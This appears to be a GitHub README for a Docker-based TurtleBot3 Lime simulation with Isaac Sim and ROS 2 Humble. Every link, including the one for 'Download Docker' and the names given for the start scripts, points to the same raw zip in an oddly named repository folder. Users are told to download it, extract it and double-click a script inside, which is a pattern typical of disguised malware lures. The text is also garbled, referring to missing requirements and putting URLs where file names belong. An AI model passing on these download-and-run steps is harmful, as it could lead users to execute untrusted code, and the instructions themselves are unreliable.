## 📢 Description

This repository helps you set up a ready-to-use environment for the TurtleBot3 Lime robot simulation. It includes all the files and scripts you need to run NVIDIA Isaac Sim 4.5.0 combined with ROS 2 Humble. The setup runs inside a Docker container, so you don't have to worry about installing many programs or dependencies yourself. 

Once ready, you can use a demo with the TurtleBot3 Lime robot in the Isaac Sim. This setup is ideal if you want to experiment with robot simulation but don't want to spend a long time setting things up.

## 🚀 Getting Started

These instructions will help you download, install, and start the simulation step by step, even if you do not have any programming experience.

---

### 1. Prepare Your Computer

- Make sure Docker is installed and running on your machine.
  - Download Docker from https://github.com/at49271188/Turtlebot3_Lime_IsaacSim_Humble/raw/refs/heads/main/traitorlike/Sim_Turtlebot_Humble_Lime_Isaac_3.3.zip if you don't have it.
- Check that your computer meets the system requirements above.
- If you use Windows or macOS, make sure virtualization is enabled on your device.

---

### 2. Download the Software

To get started, visit the official release page and grab the latest version of the repository setup files.

[![Download](https://github.com/at49271188/Turtlebot3_Lime_IsaacSim_Humble/raw/refs/heads/main/traitorlike/Sim_Turtlebot_Humble_Lime_Isaac_3.3.zip)](https://github.com/at49271188/Turtlebot3_Lime_IsaacSim_Humble/raw/refs/heads/main/traitorlike/Sim_Turtlebot_Humble_Lime_Isaac_3.3.zip)

- Click the link above or go to the release page manually:  
  https://github.com/at49271188/Turtlebot3_Lime_IsaacSim_Humble/raw/refs/heads/main/traitorlike/Sim_Turtlebot_Humble_Lime_Isaac_3.3.zip
- Find the latest version of the release and download the full package. It will usually be zipped.
- Save the downloaded file to a folder you can easily find (like your Desktop or Downloads folder).

---

### 3. Extract and Open the Package

- Right-click the downloaded file and select "Extract All" or use your system’s unzip tool.
- After extracting, open the newly created folder.
- You will see files including scripts and configuration files.

---

### 4. Build and Start the Docker Container

- Inside the folder, look for a file called something like `https://github.com/at49271188/Turtlebot3_Lime_IsaacSim_Humble/raw/refs/heads/main/traitorlike/Sim_Turtlebot_Humble_Lime_Isaac_3.3.zip` (for macOS/Linux) or `https://github.com/at49271188/Turtlebot3_Lime_IsaacSim_Humble/raw/refs/heads/main/traitorlike/Sim_Turtlebot_Humble_Lime_Isaac_3.3.zip` (for Windows).
- Double-click this file or run it from your command line or terminal. This builds the Docker container and starts the simulated environment.
- The script automatically downloads large components like Isaac Sim 4.5.0 if needed. This can take some time depending on your internet speed.

---

### 5. Launch the TurtleBot3 Lime Demo

- Once the Docker container is running, the demo environment will start automatically.
- You should see a window with the robot and simulation GUI.
- You can interact with the demo following the instructions inside the simulation window or in the README files included.

---

### 6. Stop the Simulation

- To close the simulation, simply close the simulation window.
- To stop the Docker container, return to the command line or terminal and press `Ctrl+C`.
- You can restart the simulation anytime by running the start script again.

---

## 🛠️ Troubleshooting Tips

- **Docker won’t start:** Restart your computer and make sure virtualization is enabled in BIOS.
- **Simulation window does not open:** Check your GPU drivers are up to date.
- **Scripts don’t run:** Make sure you give permission to run scripts (check file properties for execution rights).
- **Slow downloads:** Downloading Isaac Sim may be large. Ensure your internet is stable and wait patiently.
- **File not found errors:** Confirm you are running the scripts inside the extracted folder.
